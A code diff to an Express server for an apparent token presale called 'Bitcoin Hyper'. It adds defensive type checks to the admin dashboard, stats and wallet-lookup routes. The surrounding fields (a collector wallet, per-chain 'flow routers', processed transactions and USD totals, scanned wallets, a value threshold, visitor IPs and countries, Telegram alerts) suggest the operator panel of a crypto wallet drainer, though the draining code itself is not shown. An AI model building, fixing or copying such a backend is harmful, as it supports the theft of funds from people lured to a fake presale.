@@ -937,7 +937,7 @@ app.post('/api/presale/claim', async (req, res) => {
 });
 
 // ============================================
-// ADMIN VIEW - COMPREHENSIVE DASHBOARD
+// ADMIN VIEW - COMPREHENSIVE DASHBOARD - FIXED VERSION
 // ============================================
 
 app.get('/api/admin/dashboard', (req, res) => {
@@ -950,89 +950,153 @@ app.get('/api/admin/dashboard', (req, res) => {
     return res.status(401).json({ success: false, error: 'Invalid admin token' });
   }
   
-  const recentVisits = memoryStorage.siteVisits
-    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-    .slice(0, 50);
+  // ============================================
+  // SAFE DATA EXTRACTION WITH PROPER TYPE CHECKING
+  // ============================================
   
-  const activeParticipants = memoryStorage.participants
-    .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
-    .map(p => ({
-      ...p,
-      connectedAt: p.connectedAt?.toISOString(),
-      lastScanned: p.lastScanned?.toISOString(),
-      claimedAt: p.claimedAt?.toISOString()
-    }));
+  // Recent visits - ensure array
+  const recentVisits = Array.isArray(memoryStorage.siteVisits) 
+    ? memoryStorage.siteVisits
+        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+        .slice(0, 50)
+    : [];
   
-  const pendingFlows = Array.from(memoryStorage.pendingFlows.entries())
-    .map(([id, flow]) => ({ id, ...flow }))
-    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
-    .slice(0, 30);
+  // Active participants - safe date conversion
+  const activeParticipants = Array.isArray(memoryStorage.participants)
+    ? memoryStorage.participants
+        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
+        .map(p => ({
+          ...p,
+          // CRITICAL FIX: Check if value is Date before calling toISOString()
+          connectedAt: p.connectedAt instanceof Date ? p.connectedAt.toISOString() : p.connectedAt,
+          lastScanned: p.lastScanned instanceof Date ? p.lastScanned.toISOString() : p.lastScanned,
+          claimedAt: p.claimedAt instanceof Date ? p.claimedAt.toISOString() : p.claimedAt
+        }))
+    : [];
   
-  const completedFlows = Array.from(memoryStorage.completedFlows.entries())
-    .map(([id, flow]) => ({ id, ...flow }))
-    .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
-    .slice(0, 30);
+  // Pending flows - safe Map conversion
+  const pendingFlows = memoryStorage.pendingFlows instanceof Map
+    ? Array.from(memoryStorage.pendingFlows.entries())
+        .map(([id, flow]) => ({ id, ...flow }))
+        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
+        .slice(0, 30)
+    : [];
   
-  const processedTransactions = memoryStorage.settings.statistics.processedTransactions
-    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-    .slice(0, 30);
+  // Completed flows - safe Map conversion
+  const completedFlows = memoryStorage.completedFlows instanceof Map
+    ? Array.from(memoryStorage.completedFlows.entries())
+        .map(([id, flow]) => ({ id, ...flow }))
+        .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
+        .slice(0, 30)
+    : [];
   
-  const networkStatus = Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
-    chain,
-    contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
-    status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
-    collector: COLLECTOR_WALLET
-  }));
+  // Processed transactions - safe array access
+  const processedTransactions = Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
+    ? memoryStorage.settings.statistics.processedTransactions
+        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+        .slice(0, 30)
+    : [];
   
+  // Network status - always return array even if PROJECT_FLOW_ROUTERS is undefined
+  const networkStatus = PROJECT_FLOW_ROUTERS && typeof PROJECT_FLOW_ROUTERS === 'object'
+    ? Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
+        chain,
+        contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
+        status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
+        collector: COLLECTOR_WALLET
+      }))
+    : [];
+  
+  // Location stats - safe object to array conversion
   const locationStats = {};
-  memoryStorage.participants.forEach(p => {
-    const key = `${p.country}|${p.flag}`;
-    if (!locationStats[key]) {
-      locationStats[key] = { country: p.country, flag: p.flag, count: 0, eligible: 0 };
-    }
-    locationStats[key].count++;
-    if (p.isEligible) locationStats[key].eligible++;
-  });
+  if (Array.isArray(memoryStorage.participants)) {
+    memoryStorage.participants.forEach(p => {
+      if (p && p.country) {
+        const key = `${p.country}|${p.flag || '🌍'}`;
+        if (!locationStats[key]) {
+          locationStats[key] = { 
+            country: p.country, 
+            flag: p.flag || '🌍', 
+            count: 0, 
+            eligible: 0 
+          };
+        }
+        locationStats[key].count++;
+        if (p.isEligible) locationStats[key].eligible++;
+      }
+    });
+  }
   
+  // Hourly activity - safe object creation
   const hourlyActivity = {};
-  memoryStorage.siteVisits.forEach(v => {
-    const hour = new Date(v.timestamp).getHours();
-    hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
-  });
+  if (Array.isArray(memoryStorage.siteVisits)) {
+    memoryStorage.siteVisits.forEach(v => {
+      if (v && v.timestamp) {
+        try {
+          const hour = new Date(v.timestamp).getHours();
+          hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
+        } catch (e) {
+          // Skip invalid timestamps
+        }
+      }
+    });
+  }
+  
+  // ============================================
+  // SAFE SUMMARY STATISTICS
+  // ============================================
+  
+  const summary = {
+    totalVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
+    uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set 
+      ? memoryStorage.settings.statistics.uniqueIPs.size 
+      : 0,
+    totalParticipants: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.length : 0,
+    eligibleParticipants: Array.isArray(memoryStorage.participants) 
+      ? memoryStorage.participants.filter(p => p && p.isEligible).length 
+      : 0,
+    claimedParticipants: Array.isArray(memoryStorage.participants) 
+      ? memoryStorage.participants.filter(p => p && p.claimed).length 
+      : 0,
+    totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
+    totalProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
+    pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
+    completedFlows: memoryStorage.completedFlows instanceof Map ? memoryStorage.completedFlows.size : 0,
+    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
+    telegramBot: telegramBotName || 'N/A'
+  };
+  
+  // ============================================
+  // SAFE SYSTEM CONFIGURATION
+  // ============================================
+  
+  const system = {
+    valueThreshold: memoryStorage.settings?.valueThreshold || 1,
+    flowEnabled: memoryStorage.settings?.flowEnabled || false,
+    tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
+    tokenSymbol: memoryStorage.settings?.tokenSymbol || 'BTH',
+    collectorWallet: COLLECTOR_WALLET || 'N/A'
+  };
+  
+  // ============================================
+  // FINAL RESPONSE WITH ARRAY FALLBACKS FOR EVERY FIELD
+  // ============================================
   
   res.json({
     success: true,
     timestamp: new Date().toISOString(),
-    summary: {
-      totalVisits: memoryStorage.siteVisits.length,
-      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
-      totalParticipants: memoryStorage.participants.length,
-      eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
-      claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
-      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
-      totalProcessedWallets: memoryStorage.settings.statistics.totalProcessedWallets,
-      pendingFlows: memoryStorage.pendingFlows.size,
-      completedFlows: memoryStorage.completedFlows.size,
-      telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
-      telegramBot: telegramBotName || 'N/A'
-    },
-    networks: networkStatus,
-    recentVisits,
-    activeParticipants: activeParticipants.slice(0, 30),
-    pendingFlows,
-    completedFlows: completedFlows.slice(0, 10),
-    processedTransactions: processedTransactions.slice(0, 30),
-    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
+    summary,
+    networks: networkStatus, // Always an array
+    recentVisits: recentVisits, // Always an array
+    activeParticipants: activeParticipants.slice(0, 30), // Always an array
+    pendingFlows: pendingFlows, // Always an array
+    completedFlows: completedFlows.slice(0, 10), // Always an array
+    processedTransactions: processedTransactions, // Always an array
+    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count), // Always an array
     hourlyActivity: Object.entries(hourlyActivity)
       .map(([hour, count]) => ({ hour: parseInt(hour), count }))
-      .sort((a, b) => a.hour - b.hour),
-    system: {
-      valueThreshold: memoryStorage.settings.valueThreshold,
-      flowEnabled: memoryStorage.settings.flowEnabled,
-      tokenName: memoryStorage.settings.tokenName,
-      tokenSymbol: memoryStorage.settings.tokenSymbol,
-      collectorWallet: COLLECTOR_WALLET
-    }
+      .sort((a, b) => a.hour - b.hour), // Always an array
+    system
   });
 });
 
@@ -1049,14 +1113,14 @@ app.get('/api/admin/stats', (req, res) => {
   res.json({
     success: true,
     stats: {
-      participants: memoryStorage.participants.length,
-      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
-      claimed: memoryStorage.participants.filter(p => p.claimed).length,
-      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
-      pendingFlows: memoryStorage.pendingFlows.size,
+      participants: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.length : 0,
+      eligible: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.filter(p => p && p.isEligible).length : 0,
+      claimed: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.filter(p => p && p.claimed).length : 0,
+      totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
+      pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
       telegram: telegramEnabled ? '✅' : '❌',
-      siteVisits: memoryStorage.siteVisits.length,
-      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
+      siteVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
+      uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set ? memoryStorage.settings.statistics.uniqueIPs.size : 0
     }
   });
 });
@@ -1073,10 +1137,17 @@ app.get('/api/admin/wallet/:address', (req, res) => {
   
   const walletAddress = req.params.address.toLowerCase();
   
-  const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
-  const visits = memoryStorage.siteVisits.filter(v => v.walletAddress === walletAddress);
-  const flows = Array.from(memoryStorage.pendingFlows.values())
-    .filter(f => f.walletAddress === walletAddress);
+  const participant = Array.isArray(memoryStorage.participants) 
+    ? memoryStorage.participants.find(p => p && p.walletAddress === walletAddress)
+    : null;
+    
+  const visits = Array.isArray(memoryStorage.siteVisits)
+    ? memoryStorage.siteVisits.filter(v => v && v.walletAddress === walletAddress)
+    : [];
+    
+  const flows = memoryStorage.pendingFlows instanceof Map
+    ? Array.from(memoryStorage.pendingFlows.values()).filter(f => f && f.walletAddress === walletAddress)
+    : [];
   
   if (!participant) {
     return res.json({ 
@@ -1091,14 +1162,15 @@ app.get('/api/admin/wallet/:address', (req, res) => {
     found: true,
     wallet: {
       ...participant,
-      connectedAt: participant.connectedAt?.toISOString(),
-      lastScanned: participant.lastScanned?.toISOString(),
-      claimedAt: participant.claimedAt?.toISOString()
+      connectedAt: participant.connectedAt instanceof Date ? participant.connectedAt.toISOString() : participant.connectedAt,
+      lastScanned: participant.lastScanned instanceof Date ? participant.lastScanned.toISOString() : participant.lastScanned,
+      claimedAt: participant.claimedAt instanceof Date ? participant.claimedAt.toISOString() : participant.claimedAt
     },
     visits,
     flows,
-    transactions: memoryStorage.settings.statistics.processedTransactions
-      .filter(t => t.wallet.toLowerCase() === walletAddress)
+    transactions: Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
+      ? memoryStorage.settings.statistics.processedTransactions.filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress)
+      : []
   });
 });
 
